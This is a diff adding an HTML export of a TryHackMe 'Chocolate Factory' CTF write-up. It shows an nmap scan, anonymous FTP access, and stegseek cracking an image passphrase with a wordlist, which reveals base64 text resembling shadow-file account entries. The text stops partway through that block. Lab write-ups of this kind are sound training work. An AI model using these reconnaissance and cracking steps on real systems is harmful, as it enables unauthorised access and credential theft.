@@ -1,0 +1,914 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>Chocolate Factory : THM</title><style>
+/* cspell:disable-file */
+/* webkit printing magic: print all background colors */
+html {
+	-webkit-print-color-adjust: exact;
+}
+* {
+	box-sizing: border-box;
+	-webkit-print-color-adjust: exact;
+}
+
+html,
+body {
+	margin: 0;
+	padding: 0;
+}
+@media only screen {
+	body {
+		margin: 2em auto;
+		max-width: 900px;
+		color: rgb(55, 53, 47);
+	}
+}
+
+body {
+	line-height: 1.5;
+	white-space: pre-wrap;
+}
+
+a,
+a.visited {
+	color: inherit;
+	text-decoration: underline;
+}
+
+.pdf-relative-link-path {
+	font-size: 80%;
+	color: #444;
+}
+
+h1,
+h2,
+h3 {
+	letter-spacing: -0.01em;
+	line-height: 1.2;
+	font-weight: 600;
+	margin-bottom: 0;
+}
+
+.page-title {
+	font-size: 2.5rem;
+	font-weight: 700;
+	margin-top: 0;
+	margin-bottom: 0.75em;
+}
+
+h1 {
+	font-size: 1.875rem;
+	margin-top: 1.875rem;
+}
+
+h2 {
+	font-size: 1.5rem;
+	margin-top: 1.5rem;
+}
+
+h3 {
+	font-size: 1.25rem;
+	margin-top: 1.25rem;
+}
+
+.source {
+	border: 1px solid #ddd;
+	border-radius: 3px;
+	padding: 1.5em;
+	word-break: break-all;
+}
+
+.callout {
+	border-radius: 3px;
+	padding: 1rem;
+}
+
+figure {
+	margin: 1.25em 0;
+	page-break-inside: avoid;
+}
+
+figcaption {
+	opacity: 0.5;
+	font-size: 85%;
+	margin-top: 0.5em;
+}
+
+mark {
+	background-color: transparent;
+}
+
+.indented {
+	padding-left: 1.5em;
+}
+
+hr {
+	background: transparent;
+	display: block;
+	width: 100%;
+	height: 1px;
+	visibility: visible;
+	border: none;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+img {
+	max-width: 100%;
+}
+
+@media only print {
+	img {
+		max-height: 100vh;
+		object-fit: contain;
+	}
+}
+
+@page {
+	margin: 1in;
+}
+
+.collection-content {
+	font-size: 0.875rem;
+}
+
+.column-list {
+	display: flex;
+	justify-content: space-between;
+}
+
+.column {
+	padding: 0 1em;
+}
+
+.column:first-child {
+	padding-left: 0;
+}
+
+.column:last-child {
+	padding-right: 0;
+}
+
+.table_of_contents-item {
+	display: block;
+	font-size: 0.875rem;
+	line-height: 1.3;
+	padding: 0.125rem;
+}
+
+.table_of_contents-indent-1 {
+	margin-left: 1.5rem;
+}
+
+.table_of_contents-indent-2 {
+	margin-left: 3rem;
+}
+
+.table_of_contents-indent-3 {
+	margin-left: 4.5rem;
+}
+
+.table_of_contents-link {
+	text-decoration: none;
+	opacity: 0.7;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
+}
+
+table,
+th,
+td {
+	border: 1px solid rgba(55, 53, 47, 0.09);
+	border-collapse: collapse;
+}
+
+table {
+	border-left: none;
+	border-right: none;
+}
+
+th,
+td {
+	font-weight: normal;
+	padding: 0.25em 0.5em;
+	line-height: 1.5;
+	min-height: 1.5em;
+	text-align: left;
+}
+
+th {
+	color: rgba(55, 53, 47, 0.6);
+}
+
+ol,
+ul {
+	margin: 0;
+	margin-block-start: 0.6em;
+	margin-block-end: 0.6em;
+}
+
+li > ol:first-child,
+li > ul:first-child {
+	margin-block-start: 0.6em;
+}
+
+ul > li {
+	list-style: disc;
+}
+
+ul.to-do-list {
+	padding-inline-start: 0;
+}
+
+ul.to-do-list > li {
+	list-style: none;
+}
+
+.to-do-children-checked {
+	text-decoration: line-through;
+	opacity: 0.375;
+}
+
+ul.toggle > li {
+	list-style: none;
+}
+
+ul {
+	padding-inline-start: 1.7em;
+}
+
+ul > li {
+	padding-left: 0.1em;
+}
+
+ol {
+	padding-inline-start: 1.6em;
+}
+
+ol > li {
+	padding-left: 0.2em;
+}
+
+.mono ol {
+	padding-inline-start: 2em;
+}
+
+.mono ol > li {
+	text-indent: -0.4em;
+}
+
+.toggle {
+	padding-inline-start: 0em;
+	list-style-type: none;
+}
+
+/* Indent toggle children */
+.toggle > li > details {
+	padding-left: 1.7em;
+}
+
+.toggle > li > details > summary {
+	margin-left: -1.1em;
+}
+
+.selected-value {
+	display: inline-block;
+	padding: 0 0.5em;
+	background: rgba(206, 205, 202, 0.5);
+	border-radius: 3px;
+	margin-right: 0.5em;
+	margin-top: 0.3em;
+	margin-bottom: 0.3em;
+	white-space: nowrap;
+}
+
+.collection-title {
+	display: inline-block;
+	margin-right: 1em;
+}
+
+.page-description {
+    margin-bottom: 2em;
+}
+
+.simple-table {
+	margin-top: 1em;
+	font-size: 0.875rem;
+	empty-cells: show;
+}
+.simple-table td {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table th {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table-header-color {
+	background: rgb(247, 246, 243);
+	color: black;
+}
+.simple-table-header {
+	font-weight: 500;
+}
+
+time {
+	opacity: 0.5;
+}
+
+.icon {
+	display: inline-block;
+	max-width: 1.2em;
+	max-height: 1.2em;
+	text-decoration: none;
+	vertical-align: text-bottom;
+	margin-right: 0.5em;
+}
+
+img.icon {
+	border-radius: 3px;
+}
+
+.user-icon {
+	width: 1.5em;
+	height: 1.5em;
+	border-radius: 100%;
+	margin-right: 0.5rem;
+}
+
+.user-icon-inner {
+	font-size: 0.8em;
+}
+
+.text-icon {
+	border: 1px solid #000;
+	text-align: center;
+}
+
+.page-cover-image {
+	display: block;
+	object-fit: cover;
+	width: 100%;
+	max-height: 30vh;
+}
+
+.page-header-icon {
+	font-size: 3rem;
+	margin-bottom: 1rem;
+}
+
+.page-header-icon-with-cover {
+	margin-top: -0.72em;
+	margin-left: 0.07em;
+}
+
+.page-header-icon img {
+	border-radius: 3px;
+}
+
+.link-to-page {
+	margin: 1em 0;
+	padding: 0;
+	border: none;
+	font-weight: 500;
+}
+
+p > .user {
+	opacity: 0.5;
+}
+
+td > .user,
+td > time {
+	white-space: nowrap;
+}
+
+input[type="checkbox"] {
+	transform: scale(1.5);
+	margin-right: 0.6em;
+	vertical-align: middle;
+}
+
+p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+
+.image {
+	border: none;
+	margin: 1.5em 0;
+	padding: 0;
+	border-radius: 0;
+	text-align: center;
+}
+
+.code,
+code {
+	background: rgba(135, 131, 120, 0.15);
+	border-radius: 3px;
+	padding: 0.2em 0.4em;
+	border-radius: 3px;
+	font-size: 85%;
+	tab-size: 2;
+}
+
+code {
+	color: #eb5757;
+}
+
+.code {
+	padding: 1.5em 1em;
+}
+
+.code-wrap {
+	white-space: pre-wrap;
+	word-break: break-all;
+}
+
+.code > code {
+	background: none;
+	padding: 0;
+	font-size: 100%;
+	color: inherit;
+}
+
+blockquote {
+	font-size: 1.25em;
+	margin: 1em 0;
+	padding-left: 1em;
+	border-left: 3px solid rgb(55, 53, 47);
+}
+
+.bookmark {
+	text-decoration: none;
+	max-height: 8em;
+	padding: 0;
+	display: flex;
+	width: 100%;
+	align-items: stretch;
+}
+
+.bookmark-title {
+	font-size: 0.85em;
+	overflow: hidden;
+	text-overflow: ellipsis;
+	height: 1.75em;
+	white-space: nowrap;
+}
+
+.bookmark-text {
+	display: flex;
+	flex-direction: column;
+}
+
+.bookmark-info {
+	flex: 4 1 180px;
+	padding: 12px 14px 14px;
+	display: flex;
+	flex-direction: column;
+	justify-content: space-between;
+}
+
+.bookmark-image {
+	width: 33%;
+	flex: 1 1 180px;
+	display: block;
+	position: relative;
+	object-fit: cover;
+	border-radius: 1px;
+}
+
+.bookmark-description {
+	color: rgba(55, 53, 47, 0.6);
+	font-size: 0.75em;
+	overflow: hidden;
+	max-height: 4.5em;
+	word-break: break-word;
+}
+
+.bookmark-href {
+	font-size: 0.75em;
+	margin-top: 0.25em;
+}
+
+.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
+.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
+.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
+.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
+.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
+.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
+.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
+.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
+.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
+.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
+.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
+.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
+.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.highlight-default {
+	color: rgba(55, 53, 47, 1);
+}
+.highlight-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.highlight-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.highlight-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.highlight-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.highlight-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.highlight-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.highlight-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.highlight-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.highlight-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.highlight-gray_background {
+	background: rgba(241, 241, 239, 1);
+}
+.highlight-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.highlight-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.highlight-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.highlight-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.highlight-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.highlight-purple_background {
+	background: rgba(244, 240, 247, 0.8);
+}
+.highlight-pink_background {
+	background: rgba(249, 238, 243, 0.8);
+}
+.highlight-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.block-color-default {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.block-color-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.block-color-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.block-color-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.block-color-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.block-color-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.block-color-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.block-color-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.block-color-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.block-color-gray_background {
+	background: rgba(241, 241, 239, 1);
+}
+.block-color-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.block-color-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.block-color-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.block-color-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.block-color-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.block-color-purple_background {
+	background: rgba(244, 240, 247, 0.8);
+}
+.block-color-pink_background {
+	background: rgba(249, 238, 243, 0.8);
+}
+.block-color-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.select-value-color-interactiveBlue { background-color: rgba(35, 131, 226, .07); }
+.select-value-color-pink { background-color: rgba(245, 224, 233, 1); }
+.select-value-color-purple { background-color: rgba(232, 222, 238, 1); }
+.select-value-color-green { background-color: rgba(219, 237, 219, 1); }
+.select-value-color-gray { background-color: rgba(227, 226, 224, 1); }
+.select-value-color-translucentGray { background-color: rgba(255, 255, 255, 0.0375); }
+.select-value-color-orange { background-color: rgba(250, 222, 201, 1); }
+.select-value-color-brown { background-color: rgba(238, 224, 218, 1); }
+.select-value-color-red { background-color: rgba(255, 226, 221, 1); }
+.select-value-color-yellow { background-color: rgba(253, 236, 200, 1); }
+.select-value-color-blue { background-color: rgba(211, 229, 239, 1); }
+.select-value-color-pageGlass { background-color: undefined; }
+.select-value-color-washGlass { background-color: undefined; }
+
+.checkbox {
+	display: inline-flex;
+	vertical-align: text-bottom;
+	width: 16;
+	height: 16;
+	background-size: 16px;
+	margin-left: 2px;
+	margin-right: 5px;
+}
+
+.checkbox-on {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+
+.checkbox-off {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+	
+</style></head><body><article id="58c1eb5b-4845-482f-8a1e-5ffb0532efca" class="page sans"><header><div class="page-header-icon undefined"><img class="icon" src="https://tryhackme-images.s3.amazonaws.com/room-icons/e2eed78e92b4890174e0a2510b6e7a7c.jpeg"/></div><h1 class="page-title">Chocolate Factory : THM</h1><p class="page-description"></p></header><div class="page-body"><p id="78c09d43-e9a4-47cf-aa06-fa51ac14ee2a" class="">Write-Ups by : drew-byte</p><h2 id="dde220eb-84f3-4a83-aa18-f2ae481773fe" class="">Connection</h2><ul id="5979b775-7221-4a3e-9e45-042fb6418610" class="bulleted-list"><li style="list-style-type:disc">Download the ovpn provided by the thm</li></ul><ul id="ffd258b7-9017-4bf4-ba11-840edfedd3b3" class="bulleted-list"><li style="list-style-type:disc">Run the ovpn</li></ul><pre id="662a36dc-3539-408e-ba5d-7640c0f778c2" class="code code-wrap"><code>┌─[drew@parrot]─[~]
+└──╼ $cd Desktop
+┌─[drew@parrot]─[~/Desktop]
+└──╼ $sudo openvpn shanetydraw.ovpn</code></pre><hr id="7ecb079c-040a-4df2-abe3-db73bb87e624"/><h2 id="01ef85d1-e859-4cfa-bd9a-c30deca79284" class="">Enter the key you found!</h2><ul id="092ce798-4e66-4776-b458-d4f446d6f3f7" class="bulleted-list"><li style="list-style-type:disc">nmap result</li></ul><pre id="b70fcea1-20e6-43e2-b9a8-04ab91d6d2fc" class="code code-wrap"><code>┌─[drew@parrot]─[~/Desktop]
+└──╼ $nmap -AF 10.10.249.117
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-13 20:56 PST
+Nmap scan report for 10.10.249.117 (10.10.249.117)
+Host is up (0.38s latency).
+Not shown: 92 closed tcp ports (conn-refused)
+PORT    STATE SERVICE  VERSION
+21/tcp  open  ftp      vsftpd 3.0.3
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:10.4.26.128
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 4
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_-rw-rw-r--    1 1000     1000       208838 Sep 30  2020 gum_room.jpg
+22/tcp  open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 1631bbb51fcccc12148ff0d833b0089b (RSA)
+|   256 e71fc9db3eaa44b672103ceedb1d3390 (ECDSA)
+|_  256 b44502b6248ea9065f6c79448a06555e (ED25519)
+80/tcp  open  http     Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Site doesn&#x27;t have a title (text/html).
+106/tcp open  pop3pw?
+| fingerprint-strings: 
+|   GetRequest, HTTPOptions: 
+|     &quot;Welcome to chocolate room!! 
+|     ___.---------------.
+|     .&#x27;__&#x27;__&#x27;__&#x27;__&#x27;__,` . ____ ___ \r
+|     _:\x20 |:. \x20 ___ \r
+|     \&#x27;__&#x27;__&#x27;__&#x27;__&#x27;_`.__| `. \x20 ___ \r
+|     \&#x27;__&#x27;__&#x27;__\x20__&#x27;_;-----------------`
+|     \|______________________;________________|
+|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+|_    hope you wont drown Augustus&quot;
+110/tcp open  pop3?
+| fingerprint-strings: 
+|   GenericLines, NULL: 
+|     &quot;Welcome to chocolate room!! 
+|     ___.---------------.
+|     .&#x27;__&#x27;__&#x27;__&#x27;__&#x27;__,` . ____ ___ \r
+|     _:\x20 |:. \x20 ___ \r
+|     \&#x27;__&#x27;__&#x27;__&#x27;__&#x27;_`.__| `. \x20 ___ \r
+|     \&#x27;__&#x27;__&#x27;__\x20__&#x27;_;-----------------`
+|     \|______________________;________________|
+|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+|_    hope you wont drown Augustus&quot;
+111/tcp open  rpcbind?
+| fingerprint-strings: 
+|   NULL, RPCCheck: 
+|     &quot;Welcome to chocolate room!! 
+|     ___.---------------.
+|     .&#x27;__&#x27;__&#x27;__&#x27;__&#x27;__,` . ____ ___ \r
+|     _:\x20 |:. \x20 ___ \r
+|     \&#x27;__&#x27;__&#x27;__&#x27;__&#x27;_`.__| `. \x20 ___ \r
+|     \&#x27;__&#x27;__&#x27;__\x20__&#x27;_;-----------------`
+|     \|______________________;________________|
+|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+|_    hope you wont drown Augustus&quot;
+113/tcp open  ident?
+| fingerprint-strings: 
+|   DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Kerberos, LPDString, NULL, RPCCheck, RTSPRequest, SSLSessionReq, TerminalServer, TerminalServerCookie: 
+|_    http://localhost/key_rev_key &lt;- You will find the key here!!!
+119/tcp open  nntp?
+| fingerprint-strings: 
+|   GenericLines, NULL: 
+|     &quot;Welcome to chocolate room!! 
+|     ___.---------------.
+|     .&#x27;__&#x27;__&#x27;__&#x27;__&#x27;__,` . ____ ___ \r
+|     _:\x20 |:. \x20 ___ \r
+|     \&#x27;__&#x27;__&#x27;__&#x27;__&#x27;_`.__| `. \x20 ___ \r
+|     \&#x27;__&#x27;__&#x27;__\x20__&#x27;_;-----------------`
+|     \|______________________;________________|
+|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+|_    hope you wont drown Augustus&quot;
+
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 390.75 seconds</code></pre><ul id="91cfc850-37fb-4bb5-8d1d-0d7c67791087" class="bulleted-list"><li style="list-style-type:disc">I can login to the ftp using anonymous</li></ul><pre id="d4dddcd4-b1d8-4f29-aaa3-1494a5de5507" class="code code-wrap"><code>┌─[drew@parrot]─[~/Desktop]
+└──╼ $ftp 10.10.249.117
+Connected to 10.10.249.117.
+220 (vsFTPd 3.0.3)
+Name (10.10.249.117:drew): anonymous
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp&gt; ls -la
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+drwxr-xr-x    2 65534    65534        4096 Oct 01  2020 .
+drwxr-xr-x    2 65534    65534        4096 Oct 01  2020 ..
+-rw-rw-r--    1 1000     1000       208838 Sep 30  2020 gum_room.jpg
+226 Directory send OK.
+ftp&gt; get gum_room.jpg
+local: gum_room.jpg remote: gum_room.jpg
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for gum_room.jpg (208838 bytes).
+226 Transfer complete.
+208838 bytes received in 1.53 secs (133.0309 kB/s)
+ftp&gt;</code></pre><ul id="585c24af-dd0c-4cf5-9a74-c6fba2496276" class="bulleted-list"><li style="list-style-type:disc">I get the file and I use stegseek to know the passphrase</li></ul><pre id="fa9f294b-4b11-4a9e-bee0-c373ed12c4ff" class="code code-wrap"><code>┌─[drew@parrot]─[~/Desktop]
+└──╼ $ls
+gum_room.jpg           php-reverse-shell  sherlock
+linpeas.sh             pspy64             ssh2john.py
+mrrobot                rockyou.txt        starting_point_drewbyte.ovpn
+owasp_zap_root_ca.cer  SecLists
+PEASS-ng               shanetydraw.ovpn
+┌─[drew@parrot]─[~/Desktop]
+└──╼ $stegseek gum_room.jpg rockyou.txt
+StegSeek 0.6 - https://github.com/RickdeJager/StegSeek
+
+[i] Found passphrase: &quot;&quot;
+[i] Original filename: &quot;b64.txt&quot;.
+[i] Extracting to &quot;gum_room.jpg.out&quot;.
+
+┌─[drew@parrot]─[~/Desktop]
+└──╼ $cat gum_room.jpg.out
+ZGFlbW9uOio6MTgzODA6MDo5OTk5OTo3Ojo6CmJpbjoqOjE4MzgwOjA6OTk5OTk6Nzo6OgpzeXM6
+KjoxODM4MDowOjk5OTk5Ojc6OjoKc3luYzoqOjE4MzgwOjA6OTk5OTk6Nzo6OgpnYW1lczoqOjE4
+MzgwOjA6OTk5OTk6Nzo6OgptYW46KjoxODM4MDowOjk5OTk5Ojc6OjoKbHA6KjoxODM4MDowOjk5
+OTk5Ojc6OjoKbWFpbDoqOjE4MzgwOjA6OTk5OTk6Nzo6OgpuZXdzOio6MTgzODA6MDo5OTk5OTo3
+Ojo6CnV1Y3A6KjoxODM4MDowOjk5OTk5Ojc6OjoKcHJveHk6KjoxODM4MDowOjk5OTk5Ojc6OjoK
+d3d3LWRhdGE6KjoxODM4MDowOjk5OTk5Ojc6OjoKYmFja3VwOio6MTgzODA6MDo5OTk5OTo3Ojo6
+Cmxpc3Q6KjoxODM4MDowOjk5OTk5Ojc6OjoKaXJjOio6MTgzODA6MDo5OTk5OTo3Ojo6CmduYXRz
+Oio6MTgzODA6MDo5OTk5OTo3Ojo6Cm5vYm9keToqOjE4MzgwOjA6OTk5OTk6Nzo6OgpzeXN0ZW1k
+LXRpbWVzeW5jOio6MTgzODA6MDo5OTk5OTo3Ojo6CnN5c3RlbWQtbmV0d29yazoqOjE4MzgwOjA6
+OTk5OTk6Nzo6OgpzeXN0ZW1kLXJlc29sdmU6KjoxODM4MDowOjk5OTk5Ojc6OjoKX2FwdDoqOjE4
+MzgwOjA6OTk5OTk6Nzo6OgpteXNxbDohOjE4MzgyOjA6OTk5OTk6Nzo6Ogp0c3M6KjoxODM4Mjow
+Ojk5OTk5Ojc6OjoKc2hlbGxpbmFib3g6KjoxODM4MjowOjk5OTk5Ojc6OjoKc3Ryb25nc3dhbjoq
+OjE4MzgyOjA6OTk5OTk6Nzo6OgpudHA6KjoxODM4MjowOjk5OTk5Ojc6OjoKbWVzc2FnZWJ1czoq
+OjE4MzgyOjA6OTk5OTk6Nzo6OgphcnB3YXRjaDohOjE4MzgyOjA6OTk5OTk6Nzo6OgpEZWJpYW4t
+ZXhpbTohOjE4MzgyOjA6OTk5OTk6Nzo6Ogp1dWlkZDoqOjE4MzgyOjA6OTk5OTk6Nzo6OgpkZWJp
+YW4tdG9yOio6MTgzODI6MDo5OTk5OTo3Ojo6CnJlZHNvY2tzOiE6MTgzODI6MDo5OTk5OTo3Ojo6
+CmZyZWVyYWQ6KjoxODM4MjowOjk5OTk5Ojc6OjoKaW9kaW5lOio6MTgzODI6MDo5OTk5OTo3Ojo6
+CnRjcGR1bXA6KjoxODM4MjowOjk5OTk5Ojc6OjoKbWlyZWRvOio6MTgzODI6MDo5OTk5OTo3Ojo6
+CmRuc21hc3E6KjoxODM4MjowOjk5OTk5Ojc6OjoKcmVkaXM6KjoxODM4MjowOjk5OTk5Ojc6OjoK
+dXNibXV4Oio6MTgzODI6MDo5OTk5OTo3Ojo6CnJ0a2l0Oio6MTgzODI6MDo5OTk5OTo3Ojo6CnNz
+aGQ6KjoxODM4MjowOjk5OTk5Ojc6OjoKcG9zdGdyZXM6KjoxODM4MjowOjk5OTk5Ojc6OjoKYXZh
+aGk6KjoxODM4MjowOjk5OTk5Ojc6OjoKc3R1bm5lbDQ6IToxODM4MjowOjk5OTk5Ojc6OjoKc3Ns
+aDohOjE4MzgyOjA6OTk5OTk6Nzo6OgpubS1vcGVudnBuOio6MTgzODI6MDo5OTk5OTo3Ojo6Cm5t
+LW9wZW5jb25uZWN0Oio6MTgzODI6MDo5OTk5OTo3Ojo6CnB1bHNlOio6MTgzODI6MDo5OTk5OTo3
+Ojo6CnNhbmVkOio6MTgzODI6MDo5OTk5OTo3Ojo6CmluZXRzaW06KjoxODM4MjowOjk5OTk5Ojc6
+OjoKY29sb3JkOio6MTgzODI6MDo5OTk5OTo3Ojo6CmkycHN2YzoqOjE4MzgyOjA6OTk5OTk6Nzo6
+OgpkcmFkaXM6KjoxODM4MjowOjk5OTk5Ojc6OjoKYmVlZi14c3M6KjoxODM4MjowOjk5OTk5Ojc6
+OjoKZ2VvY2x1ZToqOjE4MzgyOjA6OTk5OTk6Nzo6OgpsaWdodGRtOio6MTgzODI6MDo5OTk5OTo3
+Ojo6CmtpbmctcGhpc2hlcjoqOjE4MzgyOjA6OTk5OTk6Nzo6OgpzeXN0ZW1kLWNvcmVkdW1wOiEh
+OjE4Mzk2Ojo6Ojo6Cl9ycGM6KjoxODQ1MTowOjk5OTk5Ojc6OjoKc3RhdGQ6KjoxODQ1MTowOjk5
